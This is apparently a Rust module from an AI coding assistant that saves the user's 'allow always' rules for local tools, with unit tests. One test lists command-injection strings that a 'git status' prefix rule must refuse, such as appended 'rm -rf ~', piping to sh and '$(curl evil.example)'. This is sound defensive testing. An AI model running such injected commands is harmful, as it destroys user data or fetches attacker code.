//! "Allow always" answers for local tools, saved in `permissions.toml` next
//! to the gz config (owner-only, written atomically). Rules are keyed by
//! the absolute workspace folder; a folder's rules also apply to folders
//! inside it.

use std::collections::BTreeMap;
use std::fmt;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};

use crate::assistant::permissions::{has_shell_syntax, Rules, SavedRules};
use crate::assistant::private_file::write_private;
use crate::assistant::tools::Planned;

#[derive(Debug, Default, Serialize, Deserialize)]
struct File {
    /// Workspace folder → its saved rules.
    #[serde(default)]
    workspaces: BTreeMap<PathBuf, Rules>,
}

/// One saved rule, for listing and revoking.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Rule {
    Reads(PathBuf),
    Edits,
    Command(String),
    Scripts,
    /// Pages from one host (`web_fetch`).
    Host(String),
    /// Commands that start this way, with any arguments after.
    CommandStart(String),
}

/// What `/permissions allow` takes.
pub const RULE_FORMS: &str = "edits · scripts · reads <folder> · pages <host> · \
                              command <line> (end it with * to allow any arguments after it)";

impl Rule {
    /// The rule the user typed. A `reads` folder comes back as typed: the
    /// caller resolves it against the open folders.
    pub fn parse(text: &str) -> Result<Self> {
        let text = text.trim();
        let (word, rest) = text.split_once(char::is_whitespace).unwrap_or((text, ""));
        let rest = rest.trim();
        match (word, rest.is_empty()) {
            ("edits", true) => Ok(Rule::Edits),
            ("scripts", true) => Ok(Rule::Scripts),
            ("reads", false) => Ok(Rule::Reads(PathBuf::from(rest))),
            ("pages", false) => Ok(Rule::Host(host_of(rest)?)),
            ("command", false) => command_rule(rest),
            _ => bail!("allow what? Use one of: {RULE_FORMS}"),
        }
    }
}

/// An exact command line, or with a trailing `*` how commands start.
fn command_rule(text: &str) -> Result<Rule> {
    let Some(start) = text.strip_suffix('*') else {
        return Ok(Rule::Command(text.to_string()));
    };
    let start = start.trim_end();
    if start.is_empty() {
        bail!("name the command before the *, e.g. command git status *");
    }
    if has_shell_syntax(start) {
        bail!(
            "'{start}' has shell syntax (; | & > $ …), which a rule ending in * never covers; \
             allow the exact command line instead (without the *)"
        );
    }
    Ok(Rule::CommandStart(start.to_string()))
}

/// The host of `text`, which may be a host or a whole URL.
fn host_of(text: &str) -> Result<String> {
    let url = if text.contains("://") {
        text.to_string()
    } else {
        format!("https://{text}")
    };
    reqwest::Url::parse(&url)
        .ok()
        .and_then(|url| url.host_str().map(str::to_ascii_lowercase))
        .filter(|host| !host.is_empty())
        .with_context(|| format!("'{text}' isn't a host; use one like docs.example.com"))
}

impl fmt::Display for Rule {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Rule::Reads(folder) => write!(f, "reads in {}", folder.display()),
            Rule::Edits => write!(f, "all edits"),
            Rule::Command(command) => write!(f, "command `{command}`"),
            Rule::Host(host) => write!(f, "pages from {host}"),
            Rule::Scripts => write!(f, "scripts"),
            Rule::CommandStart(start) => write!(f, "commands starting with `{start}`"),
        }
    }
}

/// A saved rule and the workspace folder it belongs to.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SavedRule {
    pub workspace: PathBuf,
    pub rule: Rule,
}

/// The rules file, at an explicit path (tests) or the default location.
#[derive(Debug, Clone)]
pub struct Store {
    path: PathBuf,
}

impl Store {
    /// `<gz config folder>/permissions.toml` (honors `XDG_CONFIG_HOME`).
    pub fn open() -> Result<Self> {
        let config = crate::config::config_path()?;
        let dir = config.parent().context("config path has no folder")?;
        Ok(Self {
            path: dir.join("permissions.toml"),
        })
    }

    #[cfg(test)]
    pub fn at(path: PathBuf) -> Self {
        Self { path }
    }

    fn read(&self) -> Result<File> {
        if !self.path.exists() {
            return Ok(File::default());
        }
        let text = std::fs::read_to_string(&self.path)
            .with_context(|| format!("cannot read {}", self.path.display()))?;
        toml::from_str(&text).with_context(|| format!("cannot parse {}", self.path.display()))
    }

    fn write(&self, file: &File) -> Result<()> {
        let text = toml::to_string_pretty(file).context("cannot encode saved permissions")?;
        write_private(&self.path, &text)
    }

    /// Every folder's saved rules; each holds inside its folder (see
    /// [`SavedRules`]).
    pub fn all(&self) -> Result<SavedRules> {
        Ok(SavedRules::new(
            self.read()?.workspaces.into_iter().collect(),
        ))
    }

    /// Saves "always" for what `planned` needs, under `root`.
    pub fn grant(&self, root: &Path, planned: &Planned) -> Result<()> {
        let mut file = self.read()?;
        file.workspaces
            .entry(root.to_path_buf())
            .or_default()
            .grant(planned);
        self.write(&file)
    }

    /// Saves `rule` under `root`; false when it was already there.
    pub fn add(&self, root: &Path, rule: &Rule) -> Result<bool> {
        let mut file = self.read()?;
        let rules = file.workspaces.entry(root.to_path_buf()).or_default();
        let added = match rule {
            Rule::Reads(folder) => {
                let new = !rules.read_folders.contains(folder);
                if new {
                    rules.read_folders.push(folder.clone());
                }
                new
            }
            Rule::Edits => !std::mem::replace(&mut rules.edits, true),
            Rule::Command(command) => rules.commands.insert(command.clone()),
            Rule::Scripts => !std::mem::replace(&mut rules.scripts, true),
            Rule::Host(host) => rules.hosts.insert(host.clone()),
            Rule::CommandStart(start) => rules.command_starts.insert(start.clone()),
        };
        if added {
            self.write(&file)?;
        }
        Ok(added)
    }

    /// Every saved rule that applies in `root` (or all of them).
    pub fn list(&self, root: Option<&Path>) -> Result<Vec<SavedRule>> {
        let file = self.read()?;
        let mut out = Vec::new();
        for (workspace, rules) in &file.workspaces {
            if root.is_some_and(|r| !r.starts_with(workspace)) {
                continue;
            }
            let entry = |rule| SavedRule {
                workspace: workspace.clone(),
                rule,
            };
            out.extend(
                rules
                    .read_folders
                    .iter()
                    .cloned()
                    .map(Rule::Reads)
                    .map(entry),
            );
            if rules.edits {
                out.push(entry(Rule::Edits));
            }
            out.extend(rules.commands.iter().cloned().map(Rule::Command).map(entry));
            out.extend(
                rules
                    .command_starts
                    .iter()
                    .cloned()
                    .map(Rule::CommandStart)
                    .map(entry),
            );
            if rules.scripts {
                out.push(entry(Rule::Scripts));
            }
            out.extend(rules.hosts.iter().cloned().map(Rule::Host).map(entry));
        }
        Ok(out)
    }

    /// Removes one saved rule; returns whether it existed.
    pub fn revoke(&self, saved: &SavedRule) -> Result<bool> {
        let mut file = self.read()?;
        let Some(rules) = file.workspaces.get_mut(&saved.workspace) else {
            return Ok(false);
        };
        let removed = match &saved.rule {
            Rule::Reads(folder) => {
                let before = rules.read_folders.len();
                rules.read_folders.retain(|f| f != folder);
                before != rules.read_folders.len()
            }
            Rule::Edits => std::mem::take(&mut rules.edits),
            Rule::Command(command) => rules.commands.remove(command),
            Rule::Scripts => std::mem::take(&mut rules.scripts),
            Rule::Host(host) => rules.hosts.remove(host),
            Rule::CommandStart(start) => rules.command_starts.remove(start),
        };
        if rules.is_empty() {
            file.workspaces.remove(&saved.workspace);
        }
        if removed {
            self.write(&file)?;
        }
        Ok(removed)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::assistant::sandbox::tests::temp_workspace;
    use crate::assistant::tools::{plan, ToolName};
    use serde_json::json;

    fn store(name: &str) -> Store {
        let dir = std::env::temp_dir().join(format!("gz-rules-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        Store::at(dir.join("permissions.toml"))
    }

    #[test]
    fn saved_rules_round_trip_and_stay_private() {
        let (dir, sandbox) = temp_workspace("rules-roundtrip");
        std::fs::write(dir.join("a.txt"), "x").unwrap();
        let store = store("roundtrip");
        let cmd = plan(
            &sandbox,
            ToolName::RunCommand,
            &json!({"command": "cargo test"}),
        )
        .unwrap();
        let write = plan(
            &sandbox,
            ToolName::WriteFile,
            &json!({"path": "a.txt", "content": "y"}),
        )
        .unwrap();
        store.grant(&sandbox.cwd(), &cmd).unwrap();
        store.grant(&sandbox.cwd(), &write).unwrap();
        let rules = store.all().unwrap();
        assert!(rules.allows(&cmd) && rules.allows(&write));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&store.path).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o600);
        }
        let listed = store.list(Some(&sandbox.cwd())).unwrap();
        assert_eq!(listed.len(), 2);
        assert!(store.revoke(&listed[0]).unwrap());
        assert_eq!(store.list(None).unwrap().len(), 1);
    }

    #[test]
    fn a_rule_granted_up_front_allows_what_it_names_and_no_more() {
        let (_dir, sandbox) = temp_workspace("rules-upfront");
        let store = store("upfront");
        let folder = sandbox.cwd();
        let command =
            |line: &str| plan(&sandbox, ToolName::RunCommand, &json!({"command": line})).unwrap();
        let allows = |line: &str| store.all().unwrap().allows(&command(line));

        let rule = Rule::parse("command git status *").unwrap();
        assert_eq!(rule, Rule::CommandStart("git status".into()));
        assert!(store.add(&folder, &rule).unwrap());
        assert!(!store.add(&folder, &rule).unwrap(), "already saved");

        assert!(allows("git status"));
        assert!(allows("git status --short src"));
        for not_covered in [
            "git statusx",
            "git stash",
            "git status; rm -rf ~",
            "git status && git push -f",
            "git status | sh",
            "git status > ~/.zshrc",
            "git status $(curl evil.example)",
            "git status `id`",
            "git status\nrm -rf ~",
        ] {
            assert!(!allows(not_covered), "{not_covered:?}");
        }

        let listed = store.list(Some(&folder)).unwrap();
        assert_eq!(
            listed
                .iter()
                .map(|saved| saved.rule.to_string())
                .collect::<Vec<_>>(),
            ["commands starting with `git status`"]
        );
        assert!(store.revoke(&listed[0]).unwrap());
        assert!(!allows("git status"), "revoked");
        assert!(store.list(None).unwrap().is_empty());
    }

    #[test]
    fn rules_are_parsed_from_what_the_user_types() {
        for (typed, rule) in [
            ("edits", Rule::Edits),
            ("scripts", Rule::Scripts),
            ("reads ~/notes", Rule::Reads(PathBuf::from("~/notes"))),
            (
                "pages docs.example.com",
                Rule::Host("docs.example.com".into()),
            ),
            (
                "pages https://Docs.Example.com:8443/a?b=c",
                Rule::Host("docs.example.com".into()),
            ),
            ("command cargo test", Rule::Command("cargo test".into())),
            (
                "command  npm run build -- --watch",
                Rule::Command("npm run build -- --watch".into()),
            ),
            ("command npm run*", Rule::CommandStart("npm run".into())),
        ] {
            assert_eq!(Rule::parse(typed).unwrap(), rule, "{typed}");
        }
        for (typed, why) in [
            ("", "allow what?"),
            ("edits everywhere", "allow what?"),
            ("command", "allow what?"),
            ("command *", "name the command"),
            ("command echo hi | sh *", "shell syntax"),
            ("pages not a host", "isn't a host"),
        ] {
            let err = Rule::parse(typed).unwrap_err();
            assert!(format!("{err:#}").contains(why), "{typed}: {err:#}");
        }
    }

    #[test]
    fn a_folders_rules_apply_inside_it_only() {
        let (dir, sandbox) = temp_workspace("rules-ancestor");
        std::fs::create_dir_all(dir.join("sub")).unwrap();
        std::fs::create_dir_all(dir.join("elsewhere")).unwrap();
        let store = store("ancestor");
        sandbox.set_cwd(&dir.join("sub")).unwrap();
        let cmd = plan(&sandbox, ToolName::RunCommand, &json!({"command": "ls"})).unwrap();
        store.grant(&dir, &cmd).unwrap();
        assert!(store.all().unwrap().allows(&cmd), "applies to subfolders");
        store.revoke(&store.list(None).unwrap()[0]).unwrap();
        store.grant(&dir.join("sub"), &cmd).unwrap();
        sandbox.set_cwd(&dir.join("elsewhere")).unwrap();
        let elsewhere = plan(&sandbox, ToolName::RunCommand, &json!({"command": "ls"})).unwrap();
        assert!(!store.all().unwrap().allows(&elsewhere));
        assert!(store.list(Some(&dir.join("elsewhere"))).unwrap().is_empty());
    }
}
